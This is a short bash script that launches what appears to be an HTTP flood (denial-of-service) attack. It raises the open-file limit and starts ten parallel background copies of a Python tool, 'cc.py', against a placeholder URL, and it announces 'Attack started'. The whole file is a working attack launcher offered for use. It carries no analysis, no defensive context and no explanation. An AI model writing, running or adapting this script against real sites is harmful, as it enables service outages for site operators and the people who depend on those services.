#!/bin/bash
atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"

process=10

ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
